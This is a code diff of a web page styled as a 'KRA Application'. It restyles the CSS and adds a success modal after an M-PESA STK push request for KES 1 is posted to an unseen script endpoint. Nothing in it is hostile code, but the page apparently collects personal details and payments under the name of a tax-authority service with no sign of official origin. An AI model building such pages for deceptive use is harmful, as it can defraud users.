@@ -6,10 +6,28 @@
 <title>KRA Application</title>
 
 <style>
-body { font-family:'Segoe UI',sans-serif; background:#f3f7f6; padding:20px; }
-.container { max-width:1000px; margin:auto; background:#fff; border-radius:20px; padding:35px; box-shadow:0 8px 30px rgba(0,0,0,0.08); border-top:5px solid #10b981; }
+body { 
+  font-family:'Segoe UI',sans-serif; 
+  background:#f3f7f6; 
+  padding:20px; 
+  margin:0;
+}
+.container { 
+  max-width:1000px; 
+  margin:auto; 
+  background:#fff; 
+  border-radius:20px; 
+  padding:35px; 
+  box-shadow:0 8px 30px rgba(0,0,0,0.08); 
+  border-top:5px solid #10b981; 
+}
+
 .header { text-align:center; margin-bottom:30px; }
-.icon { width:65px; height:65px; background:#10b981; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:auto; color:white; font-size:26px; }
+.icon { 
+  width:65px; height:65px; background:#10b981; border-radius:50%; 
+  display:flex; align-items:center; justify-content:center; margin:auto; 
+  color:white; font-size:26px; 
+}
 h1 { color:#059669; margin-top:15px; }
 .sub { color:#6b7280; font-size:14px; }
 
@@ -22,22 +40,90 @@ h1 { color:#059669; margin-top:15px; }
 .field { display:flex; flex-direction:column; }
 label { font-size:13px; font-weight:600; margin-bottom:6px; }
 
-input, select { padding:14px; border-radius:10px; border:1px solid #d1d5db; outline:none; }
-input:focus, select:focus { border-color:#10b981; box-shadow:0 0 0 3px rgba(16,185,129,0.2); }
+input, select { 
+  padding:14px; border-radius:10px; border:1px solid #d1d5db; outline:none; 
+}
+input:focus, select:focus { 
+  border-color:#10b981; box-shadow:0 0 0 3px rgba(16,185,129,0.2); 
+}
 
-button { margin-top:25px; width:100%; padding:15px; background:#10b981; color:white; border:none; border-radius:10px; font-size:16px; cursor:pointer; }
+button { 
+  margin-top:25px; width:100%; padding:15px; background:#10b981; color:white; 
+  border:none; border-radius:10px; font-size:16px; cursor:pointer; 
+}
 button:hover { background:#059669; }
 button:disabled { background:#9ca3af; cursor:not-allowed; }
 
 .screen { display:none; }
 .active { display:block; }
 
-#status { margin-top:15px; text-align:center; font-weight:bold; line-height:1.5; padding:10px; border-radius:8px; }
+#status { margin-top:15px; text-align:center; font-weight:bold; }
 
-.spinner { display:none; width:50px; height:50px; border:5px solid #f3f3f3; border-top:5px solid #10b981; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
+/* Spinner */
+.spinner { 
+  display:none; width:50px; height:50px; border:5px solid #f3f3f3; 
+  border-top:5px solid #10b981; border-radius:50%; animation:spin 1s linear infinite; 
+  margin:20px auto; 
+}
 @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
 
 .mpesa-logo { width:100px; height:100px; margin:20px auto; display:block; }
+
+/* Beautiful Success Modal */
+.success-modal {
+  position: fixed;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0,0,0,0.7);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.success-content {
+  background: white;
+  padding: 40px 30px;
+  border-radius: 20px;
+  text-align: center;
+  max-width: 420px;
+  box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+  animation: popUp 0.4s ease;
+}
+
+@keyframes popUp {
+  from { transform: scale(0.7); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+
+.success-icon {
+  font-size: 60px;
+  margin-bottom: 20px;
+}
+
+.success-content h2 {
+  color: #10b981;
+  margin: 10px 0 15px;
+}
+
+.success-content p {
+  color: #374151;
+  line-height: 1.6;
+  margin-bottom: 25px;
+}
+
+.close-btn {
+  background: #10b981;
+  color: white;
+  border: none;
+  padding: 12px 30px;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.close-btn:hover {
+  background: #059669;
+}
 </style>
 </head>
 <body>
@@ -104,7 +190,7 @@ button:disabled { background:#9ca3af; cursor:not-allowed; }
     <div class="header">
       <div class="icon">💳</div>
       <h1>Complete Payment</h1>
-      <div class="sub">Enter your M-PESA number to receive payment prompt</div>
+      <div class="sub">Enter your M-PESA number</div>
     </div>
 
     <div class="field">
@@ -112,7 +198,7 @@ button:disabled { background:#9ca3af; cursor:not-allowed; }
       <input id="mpesa" placeholder="07XXXXXXXX" maxlength="10">
     </div>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" 
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/M-pesa-logo.png" 
          class="mpesa-logo" alt="M-PESA">
 
     <div id="spinner" class="spinner"></div>
@@ -122,6 +208,19 @@ button:disabled { background:#9ca3af; cursor:not-allowed; }
     <div id="status"></div>
   </div>
 
+</div>
+
+<!-- BEAUTIFUL SUCCESS MODAL -->
+<div id="successModal" class="success-modal">
+  <div class="success-content">
+    <div class="success-icon">✅</div>
+    <h2>Application Submitted Successfully!</h2>
+    <p>Your KRA PIN application has been received and is being processed.</p>
+    <p><strong>Please check your phone and complete the M-PESA payment of KES 1.</strong></p>
+    <p style="color:#10b981; font-weight:600;">You will be contacted once your application is fully processed.</p>
+    
+    <button class="close-btn" onclick="closeModal()">Submit Another Application</button>
+  </div>
 </div>
 
 <script>
@@ -142,7 +241,7 @@ document.getElementById("form").addEventListener("submit", function(e) {
   document.getElementById("paymentScreen").classList.add("active");
 });
 
-// IMPROVED PAYMENT FUNCTION
+// PAYMENT FUNCTION
 async function payNow() {
   const phoneInput = document.getElementById("mpesa").value.trim();
   const statusEl = document.getElementById("status");
@@ -164,12 +263,10 @@ async function payNow() {
     return;
   }
 
-  // UI Loading
   payButton.disabled = true;
-  payButton.textContent = "Sending STK...";
+  payButton.textContent = "Processing...";
   spinner.style.display = "block";
-  statusEl.style.color = "#666";
-  statusEl.innerText = "⏳ Sending M-PESA prompt to your phone...";
+  statusEl.innerText = "⏳ Sending M-PESA STK Push...";
 
   try {
     const payload = {
@@ -179,44 +276,30 @@ async function payNow() {
       amount: "1"
     };
 
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 25000); // 25 second timeout
-
     const response = await fetch(scriptURL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams(payload),
-      signal: controller.signal
+      body: new URLSearchParams(payload)
     });
 
-    clearTimeout(timeoutId);
-
     const text = await response.text();
-    console.log("Raw server response:", text);
-
     let result;
     try {
       result = JSON.parse(text);
-    } catch (e) {
-      result = { status: "error", message: "Invalid server response" };
+    } catch(e) {
+      result = { status: "error", message: "Invalid response" };
     }
 
     if (result.status === "success") {
-      statusEl.style.color = "#10b981";
-      statusEl.innerHTML = `✅ STK Push Sent Successfully!<br>Check your phone and enter PIN to complete payment.`;
+      // Show Beautiful Modal
+      document.getElementById("successModal").style.display = "flex";
     } else {
-      statusEl.style.color = "#dc2626";
       statusEl.innerText = `❌ ${result.message || "Failed to send STK"}`;
     }
 
   } catch (err) {
-    console.error("Fetch Error:", err);
-    statusEl.style.color = "#dc2626";
-    if (err.name === "AbortError") {
-      statusEl.innerText = "❌ Request timed out. Please try again.";
-    } else {
-      statusEl.innerText = "❌ Network error. Please check your internet and try again.";
-    }
+    console.error(err);
+    statusEl.innerText = "❌ Network error. Please try again.";
   } finally {
     setTimeout(() => {
       spinner.style.display = "none";
@@ -224,6 +307,12 @@ async function payNow() {
       payButton.textContent = "Pay Now - KES 1";
     }, 6000);
   }
+}
+
+// Close Modal and Reset Form
+function closeModal() {
+  document.getElementById("successModal").style.display = "none";
+  location.reload();   // Refresh to start new application
 }
 </script>
 
